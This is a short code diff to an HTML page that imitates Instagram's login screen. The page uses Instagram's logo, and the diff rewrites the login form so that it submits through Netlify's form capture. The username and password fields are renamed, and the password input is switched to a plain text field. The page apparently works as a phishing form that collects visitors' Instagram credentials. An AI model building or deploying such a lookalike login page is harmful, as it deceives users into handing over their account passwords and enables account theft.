@@ -19,13 +19,10 @@
                 <h1 title="Instagram" class="flex justify-content-center">
                     <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
-                <form name="login" netlify>
-                    <label for="email" class="sr-only">Phone number, username or email</label>
-                    <input name="email" placeholder="Phone number, username or email" />
+                <form name="login" method="POST" data-netlify="true">
 
-                    <label for="password" class="sr-only">Password</label>
-                    <input name="password" type="password" placeholder="Password" />
-
+                    <label>Phone number, username or email <input type="text" name="username"/></label>
+                    <label>Password <input type="text" name="password"/></label>
                     <button type="submit">Login</button>
                 </form>
                 <div class="flex separator align-items-center">
